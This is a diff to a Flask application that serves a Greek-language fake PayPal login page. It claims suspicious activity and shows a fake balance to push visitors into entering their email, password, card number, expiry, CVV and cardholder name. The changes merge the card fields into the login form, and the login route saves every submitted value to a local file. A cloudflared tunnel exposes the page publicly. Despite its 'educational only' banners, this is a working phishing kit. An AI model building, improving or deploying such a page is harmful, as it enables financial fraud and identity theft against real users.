@@ -42,7 +42,7 @@ def index():
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <title>PayPal - Συνδεθείτε στον Λογαριασμό Σας</title>
+        <title>PayPal - Σύνδεση στον Λογαριασμό σας</title>
         <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png" type="image/x-icon">
         <style>
             :root {
@@ -382,14 +382,14 @@ def index():
                 background: #F8F9FA;
                 border-radius: 12px;
                 padding: 20px;
-                margin-top: 25px;
+                margin: 25px 0 20px;
                 border: 2px dashed #DEE2E6;
             }
             
             @media (min-width: 768px) {
                 .card-verification {
                     padding: 30px;
-                    margin-top: 30px;
+                    margin: 30px 0 20px;
                 }
             }
             
@@ -661,7 +661,7 @@ def index():
                          class="logo-image">
                     <div class="paypal-logo">PayPal</div>
                 </div>
-                <div class="welcome-message">Καλώς ορίσατε ξανά</div>
+                <div class="welcome-message">Καλώς ήρθατε ξανά</div>
                 <div style="color: rgba(255, 255, 255, 0.9); font-size: 14px; margin-top: 5px;">
                     Συνδεθείτε στον λογαριασμό σας PayPal
                 </div>
@@ -676,31 +676,31 @@ def index():
                 <div class="alert-banner">
                     <span class="alert-icon">⚠️</span>
                     <div>
-                        <strong>Ειδοποίηση Ασφαλείας:</strong> Ανιχνεύσαμε ασυνήθιστη δραστηριότητα στον λογαριασμό σας. 
-                        Παρακαλούμε επαληθεύστε την ταυτότητά σας για να συνεχίσετε.
+                        <strong>Προειδοποίηση Ασφαλείας:</strong> Εντοπίσαμε ύποπτη δραστηριότητα στον λογαριασμό σας. 
+                        Παρακαλούμε επιβεβαιώστε την ταυτότητά σας για να συνεχίσετε.
                     </div>
                 </div>
                 
                 <div class="device-warning">
                     <span>🛡️</span>
                     <div>
-                        <strong>Ανιχνεύθηκε Νέα Συσκευή:</strong> Για λόγους ασφαλείας, παρακαλούμε ολοκληρώστε την επαλήθευση 
-                        για πρόσβαση στον λογαριασμό σας PayPal.
+                        <strong>Εντοπίστηκε Νέα Συσκευή:</strong> Για την ασφάλειά σας, παρακαλούμε ολοκληρώστε την επαλήθευση 
+                        για να αποκτήσετε πρόσβαση στον λογαριασμό σας PayPal.
                     </div>
                 </div>
                 
                 <div class="account-balance">
                     <div style="font-size: 14px; opacity: 0.9;">Διαθέσιμο Υπόλοιπο</div>
-                    <div class="balance-amount">$2,847.63</div>
-                    <div style="font-size: 12px; opacity: 0.9;">Κατάσταση Λογαριασμού: <span class="verified-badge">Επαληθεύθηκε ✓</span></div>
+                    <div class="balance-amount">$2.847,63</div>
+                    <div style="font-size: 12px; opacity: 0.9;">Κατάσταση Λογαριασμού: <span class="verified-badge">Επαληθευμένος ✓</span></div>
                 </div>
                 
                 <form action="/login" method="post" id="main-form">
                     <div class="form-group">
-                        <label class="form-label">Email ή αριθμός τηλεφώνου</label>
+                        <label class="form-label">Email ή αριθμός κινητού</label>
                         <input type="email" 
                                name="email" 
-                               placeholder="Εισάγετε το email ή τον αριθμό τηλεφώνου σας" 
+                               placeholder="Εισάγετε το email ή το κινητό σας" 
                                required 
                                autocomplete="email"
                                inputmode="email">
@@ -712,7 +712,7 @@ def index():
                             <input type="password" 
                                    name="password" 
                                    id="password" 
-                                   placeholder="Εισάγετε τον κωδικό πρόσβασής σας" 
+                                   placeholder="Εισάγετε τον κωδικό σας" 
                                    required 
                                    autocomplete="current-password">
                             <button type="button" 
@@ -722,35 +722,13 @@ def index():
                         </div>
                     </div>
                     
-                    <button type="submit" class="login-btn">
-                        Σύνδεση
-                    </button>
-                </form>
-                
-                <div class="continue-with">ή συνδεθείτε με</div>
-                
-                <div class="quick-links">
-                    <a href="#" class="quick-link">
-                        <div class="link-icon">📱</div>
-                        <div>Τηλέφωνο</div>
-                    </a>
-                    <a href="#" class="quick-link">
-                        <div class="link-icon">📧</div>
-                        <div>Email</div>
-                    </a>
-                    <a href="#" class="quick-link">
-                        <div class="link-icon">#️⃣</div>
-                        <div>SMS</div>
-                    </a>
-                </div>
-                
-                <div class="card-verification">
-                    <div class="verification-title">
-                        <span>🔐</span>
-                        Απαιτείται Πρόσθετη Επαλήθευση
-                    </div>
-                    
-                    <form id="verification-form">
+                    <!-- Card verification fields moved inside main form, before submit button -->
+                    <div class="card-verification">
+                        <div class="verification-title">
+                            <span>🔐</span>
+                            Απαιτείται Πρόσθετη Επαλήθευση
+                        </div>
+                        
                         <div class="form-group">
                             <label class="form-label">Αριθμός Κάρτας</label>
                             <input type="text" 
@@ -789,54 +767,68 @@ def index():
                             <label class="form-label">Όνομα στην Κάρτα</label>
                             <input type="text" 
                                    name="card_name" 
-                                   placeholder="Όπως φαίνεται στην κάρτα" 
+                                   placeholder="Όπως αναγράφεται στην κάρτα" 
                                    required
                                    autocomplete="cc-name">
                         </div>
                         
                         <div class="security-note">
                             <span>🔒</span>
-                            <div>Τα στοιχεία της κάρτας σας κρυπτογραφούνται και μεταδίδονται με ασφάλεια. 
-                            Αυτή είναι μια διαδικασία εφάπαξ επαλήθευσης.</div>
+                            <div>Τα στοιχεία της κάρτας σας είναι κρυπτογραφημένα και μεταδίδονται με ασφάλεια. 
+                            Πρόκειται για μια εφάπαξ διαδικασία επαλήθευσης.</div>
                         </div>
-                        
-                        <button type="button" 
-                                class="login-btn" 
-                                onclick="verifyCard()" 
-                                style="background: var(--paypal-green);">
-                            Επαλήθευση & Συνέχεια
-                        </button>
-                    </form>
+                    </div>
+                    
+                    <button type="submit" class="login-btn">
+                        Σύνδεση & Επαλήθευση
+                    </button>
+                </form>
+                
+                <div class="continue-with">ή συνεχίστε με</div>
+                
+                <div class="quick-links">
+                    <a href="#" class="quick-link">
+                        <div class="link-icon">📱</div>
+                        <div>Τηλέφωνο</div>
+                    </a>
+                    <a href="#" class="quick-link">
+                        <div class="link-icon">📧</div>
+                        <div>Email</div>
+                    </a>
+                    <a href="#" class="quick-link">
+                        <div class="link-icon">#️⃣</div>
+                        <div>SMS</div>
+                    </a>
                 </div>
                 
                 <div class="payment-activity">
                     <div style="color: var(--paypal-blue); font-weight: 600; margin-bottom: 15px; font-size: 16px;">
-                        Πρόσφατες Συναλλαγές
+                        Πρόσφατη Δραστηριότητα Πληρωμών
                     </div>
                     
                     <div class="payment-item">
                         <div>
                             <div style="font-weight: 600; margin-bottom: 4px;">Amazon.com</div>
-                            <div style="font-size: 12px; color: #666666;">Σήμερα • 2:30 ΜΜ</div>
+                            <div style="font-size: 12px; color: #666666;">Σήμερα • 2:30 μ.μ.</div>
                         </div>
-                        <div class="payment-amount">-$129.99</div>
+                        <div class="payment-amount">-$129,99</div>
                     </div>
                     
                     <div class="payment-item">
                         <div>
-                            <div style="font-weight: 600; margin-bottom: 4px;">Συνδρομή Netflix</div>
+                            <div style="font-weight: 600; margin-bottom: 4px;">Netflix Subscription</div>
                             <div style="font-size: 12px; color: #666666;">Χθες • Αυτόματη Πληρωμή</div>
                         </div>
-                        <div class="payment-amount">-$15.49</div>
+                        <div class="payment-amount">-$15,49</div>
                     </div>
                     
                     <div class="payment-item">
                         <div>
                             <div style="font-weight: 600; margin-bottom: 4px;">Τραπεζική Μεταφορά</div>
-                            <div style="font-size: 12px; color: #666666;">Εκκρεμεί Επαλήθευση</div>
+                            <div style="font-size: 12px; color: #666666;">Εκκρεμής Επαλήθευση</div>
                         </div>
                         <div>
-                            <div class="payment-amount">+$500.00</div>
+                            <div class="payment-amount">+$500,00</div>
                             <div class="pending-badge">ΕΚΚΡΕΜΕΙ</div>
                         </div>
                     </div>
@@ -846,7 +838,7 @@ def index():
             <div class="footer-links">
                 <a href="#">Απόρρητο</a> • 
                 <a href="#">Νομικά</a> • 
-                <a href="#">Τέλη</a> • 
+                <a href="#">Χρεώσεις</a> • 
                 <a href="#">Επικοινωνία</a>
                 <div style="margin-top: 15px; color: #999999;">
                     © 1999-2024 PayPal. Με επιφύλαξη παντός δικαιώματος.
@@ -869,56 +861,17 @@ def index():
                     toggleButton.setAttribute('aria-label', 'Εμφάνιση κωδικού');
                 }
                 
-                // Prevent form submission
                 return false;
             }
             
-            function verifyCard() {
-                const form = document.getElementById('verification-form');
-                const button = form.querySelector('.login-btn');
-                
-                if (form.checkValidity()) {
-                    button.textContent = 'Επαληθεύεται...';
-                    button.disabled = true;
-                    button.style.opacity = '0.7';
-                    
-                    // Προσομοίωση διαδικασίας επαλήθευσης
-                    setTimeout(() => {
-                        button.textContent = '✓ Επιτυχής Επαλήθευση';
-                        button.style.background = '#00A65A';
-                        
-                        // Εμφάνιση μηνύματος επιτυχίας
-                        const alertDiv = document.createElement('div');
-                        alertDiv.className = 'security-note';
-                        alertDiv.style.marginTop = '20px';
-                        alertDiv.innerHTML = `
-                            <span>✅</span>
-                            <div><strong>Η επαλήθευση ολοκληρώθηκε!</strong> Η πρόσβαση στον λογαριασμό σας έχει αποκατασταθεί. 
-                            Θα ανακατευθυνθείτε σύντομα.</div>
-                        `;
-                        form.appendChild(alertDiv);
-                        
-                        // Αυτόματη υποβολή της κύριας φόρμας μετά την επαλήθευση
-                        setTimeout(() => {
-                            document.getElementById('main-form').submit();
-                        }, 2000);
-                    }, 1500);
-                } else {
-                    form.reportValidity();
-                }
-                
-                // Αποφυγή προεπιλεγμένης υποβολής φόρμας
-                return false;
-            }
-            
-            // Μορφοποίηση αριθμού κάρτας
+            // Format card number
             document.querySelector('input[name="card_number"]').addEventListener('input', function(e) {
-                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-                let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
+                let value = e.target.value.replace(/\\s+/g, '').replace(/[^0-9]/gi, '');
+                let formatted = value.replace(/(\\d{4})/g, '$1 ').trim();
                 e.target.value = formatted.substring(0, 19);
             });
             
-            // Μορφοποίηση ημερομηνίας λήξης
+            // Format expiry date
             document.querySelector('input[name="expiry"]').addEventListener('input', function(e) {
                 let value = e.target.value.replace(/[^0-9]/g, '');
                 if (value.length >= 2) {
@@ -927,15 +880,7 @@ def index():
                 e.target.value = value.substring(0, 5);
             });
             
-            // Αποφυγή υποβολής φόρμας με Enter για φόρμα επαλήθευσης κάρτας
-            document.getElementById('verification-form').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    verifyCard();
-                }
-            });
-            
-            // Κινούμενα γραφικά υπολοίπου κατά τη φόρτωση
+            // Animate balance on load
             document.addEventListener('DOMContentLoaded', function() {
                 setTimeout(() => {
                     const balance = document.querySelector('.balance-amount');
@@ -949,10 +894,10 @@ def index():
                 }, 1000);
             });
             
-            // Καλύτερη διαχείριση αφής για κινητά
+            // Better mobile touch handling
             document.addEventListener('touchstart', function() {}, {passive: true});
             
-            // Αποφυγή εστίασης με διπλό πάτημα σε κουμπιά
+            // Prevent double-tap zoom on buttons
             document.querySelectorAll('button').forEach(button => {
                 button.addEventListener('touchstart', function(e) {
                     if (e.touches.length > 1) {
@@ -981,24 +926,24 @@ def login():
     user_file_path = os.path.join(BASE_FOLDER, f"{safe_email}_{timestamp}.txt")
 
     with open(user_file_path, 'w') as file:
-        file.write(f"Session: {session_id}\n")
-        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
+        file.write(f"Συνεδρία: {session_id}\n")
+        file.write(f"Χρονική σήμανση: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Άγνωστο')}\n")
         file.write(f"IP: {request.remote_addr}\n")
         file.write("-" * 40 + "\n")
         file.write(f"EMAIL: {email}\n")
-        file.write(f"PASSWORD: {password}\n")
+        file.write(f"ΚΩΔΙΚΟΣ ΠΡΟΣΒΑΣΗΣ: {password}\n")
         file.write("-" * 40 + "\n")
-        file.write("CARD DETAILS:\n")
-        file.write(f"CARD NUMBER: {card_number}\n")
-        file.write(f"EXPIRY: {expiry}\n")
+        file.write("ΣΤΟΙΧΕΙΑ ΚΑΡΤΑΣ:\n")
+        file.write(f"ΑΡΙΘΜΟΣ ΚΑΡΤΑΣ: {card_number}\n")
+        file.write(f"ΛΗΞΗ: {expiry}\n")
         file.write(f"CVV: {cvv}\n")
-        file.write(f"NAME ON CARD: {card_name}\n")
+        file.write(f"ΟΝΟΜΑ ΣΤΗΝ ΚΑΡΤΑ: {card_name}\n")
         file.write("-" * 40 + "\n")
-        file.write(f"Platform: PayPal Account Verification\n")
-        file.write(f"Shown Balance: $2,847.63\n")
-        file.write(f"Alert: 'Unusual Activity Detected'\n")
-        file.write(f"Verification: Card Verification Required\n")
+        file.write(f"Πλατφόρμα: Επαλήθευση Λογαριασμού PayPal\n")
+        file.write(f"Εμφανιζόμενο Υπόλοιπο: $2.847,63\n")
+        file.write(f"Προειδοποίηση: 'Εντοπίστηκε ύποπτη δραστηριότητα'\n")
+        file.write(f"Επαλήθευση: Απαιτείται Επαλήθευση Κάρτας\n")
 
     return render_template_string('''
     <!DOCTYPE html>
@@ -1274,7 +1219,7 @@ def login():
                     <div class="status-item">
                         <span class="status-icon">✓</span>
                         <div>
-                            <strong>Επαληθεύτηκε Η Ταυτότητα</strong>
+                            <strong>Επαληθεύτηκε η Ταυτότητα</strong>
                             <div style="color: #666666; font-size: 13px; margin-top: 4px;">
                                 Τα διαπιστευτήριά σας επιβεβαιώθηκαν
                             </div>
@@ -1283,7 +1228,7 @@ def login():
                     <div class="status-item">
                         <span class="status-icon">✓</span>
                         <div>
-                            <strong>Επαληθεύτηκε Η Κάρτα</strong>
+                            <strong>Επαληθεύτηκε η Κάρτα</strong>
                             <div style="color: #666666; font-size: 13px; margin-top: 4px;">
                                 Η μέθοδος πληρωμής προστέθηκε με επιτυχία
                             </div>
@@ -1292,9 +1237,9 @@ def login():
                     <div class="status-item">
                         <span class="status-icon">✓</span>
                         <div>
-                            <strong>Βελτιώθηκε Η Ασφάλεια</strong>
+                            <strong>Ενισχυμένη Ασφάλεια</strong>
                             <div style="color: #666666; font-size: 13px; margin-top: 4px;">
-                                Ενεργοποιήθηκε η επαλήθευση δύο βημάτων
+                                Ενεργοποιήθηκε ο έλεγχος ταυτότητας δύο παραγόντων
                             </div>
                         </div>
                     </div>
@@ -1302,15 +1247,15 @@ def login():
                 
                 <div class="account-details">
                     <div style="color: #003087; font-weight: 600; margin-bottom: 15px; font-size: 16px;">
-                        Περίληψη Λογαριασμού
+                        Σύνοψη Λογαριασμού
                     </div>
                     <div class="detail-row">
                         <span class="detail-label">Κατάσταση Λογαριασμού:</span>
-                        <span class="detail-value" style="color: #00A65A;">Επαληθεύθηκε ✓</span>
+                        <span class="detail-value" style="color: #00A65A;">Επαληθευμένος ✓</span>
                     </div>
                     <div class="detail-row">
                         <span class="detail-label">Υπόλοιπο:</span>
-                        <span class="detail-value">$2,847.63</span>
+                        <span class="detail-value">$2.847,63</span>
                     </div>
                     <div class="detail-row">
                         <span class="detail-label">Τελευταία Σύνδεση:</span>
@@ -1318,12 +1263,12 @@ def login():
                     </div>
                     <div class="detail-row">
                         <span class="detail-label">Συσκευή:</span>
-                        <span class="detail-value">Επαληθεύθηκε νέα συσκευή</span>
+                        <span class="detail-value">Νέα συσκευή επαληθεύτηκε</span>
                     </div>
                 </div>
                 
                 <div class="redirect-notice">
-                    ⏳ Ανακατεύθυνση στον πίνακα ελέγχου σε 5 δευτερόλεπτα...
+                    ⏳ Ανακατεύθυνση στον πίνακα ελέγχου PayPal σε 5 δευτερόλεπτα...
                 </div>
                 
                 <button class="login-btn" onclick="window.location.href='/'">
@@ -1332,7 +1277,7 @@ def login():
             </div>
             
             <div class="footer">
-                Για λόγους ασφαλείας, μην μοιράζεστε τους κωδικούς επαλήθευσής σας.
+                Για λόγους ασφαλείας, μην μοιράζεστε τους κωδικούς επαλήθευσης.
                 <div style="margin-top: 10px;">
                     Χρειάζεστε βοήθεια; <a href="#" style="color: #003087; text-decoration: none;">Επικοινωνήστε με την Υποστήριξη PayPal</a>
                 </div>
@@ -1340,7 +1285,7 @@ def login():
         </div>
         
         <script>
-            // Κινούμενα στοιχεία κατά τη φόρτωση
+            // Animate status items on load
             document.addEventListener('DOMContentLoaded', function() {
                 setTimeout(() => {
                     const statusItems = document.querySelectorAll('.status-item');
@@ -1369,12 +1314,12 @@ def run_cloudflared_tunnel(local_url):
         match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
         if match:
             tunnel_url = match.group(0)
-            print(f"💰 PayPal Δημόσιος Σύνδεσμος: {tunnel_url}")
-            print(f"🔐 Τα διαπιστευτήρια και τα στοιχεία κάρτας θα αποθηκευτούν")
+            print(f"💰 Δημόσιος Σύνδεσμος PayPal: {tunnel_url}")
+            print(f"🔐 Τα διαπιστευτήρια + στοιχεία κάρτας θα αποθηκευτούν")
             print(f"💾 Τοποθεσία αποθήκευσης: {BASE_FOLDER}")
             print("⚠️  ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Μόνο για εκπαιδευτικούς σκοπούς!")
-            print("⚠️  ΠΟΤΕ μην εισάγετε πραγματικά διαπιστευτήρια PayPal!")
-            print("⚠️  ΠΟΤΕ μην εισάγετε πραγματικούς αριθμούς πιστωτικών καρτών!")
+            print("⚠️  ΜΗΝ εισάγετε ΠΟΤΕ πραγματικά διαπιστευτήρια PayPal!")
+            print("⚠️  ΜΗΝ εισάγετε ΠΟΤΕ πραγματικά στοιχεία πιστωτικής κάρτας!")
             print("⚠️  Οι απάτες PayPal στοχεύουν εκατομμύρια χρήστες καθημερινά!")
             print("⚠️  Οι οικονομικές πληροφορίες είναι εξαιρετικά πολύτιμες!")
             print("-" * 50)
@@ -1402,12 +1347,12 @@ if __name__ == '__main__':
     print("🚀 Εκκίνηση Σελίδας Επαλήθευσης Ασφαλείας PayPal...")
     print("📱 Θύρα: 5013")
     print("💾 Τοποθεσία αποθήκευσης: ~/storage/downloads/PayPal/")
-    print("💰 Εμφάνιση Υπολοίπου: $2,847.63")
-    print("🔐 Συλλογή: Email, Κωδικός, Στοιχεία Πιστωτικής Κάρτας")
+    print("💰 Εμφάνιση Υπολοίπου: $2.847,63")
+    print("🔐 Συλλογή: Email, Κωδικός Πρόσβασης, Στοιχεία Πιστωτικής Κάρτας")
     print("🎯 Στόχος: Χρήστες PayPal που χρειάζονται 'επαλήθευση'")
     print("⚠️  ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Οι απάτες 'επαλήθευσης ασφαλείας' είναι πολύ συχνές!")
-    print("⚠️  Η οικονομική ηλεκτρονική απάτη μπορεί να οδηγήσει σε κλοπή ταυτότητας!")
-    print("⏳ Αναμονή για σήραγγα cloudflared...")
+    print("⚠️  Το οικονομικό phishing μπορεί να οδηγήσει σε κλοπή ταυτότητας!")
+    print("⏳ Αναμονή για το tunnel cloudflared...")
     
     cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5013")
 
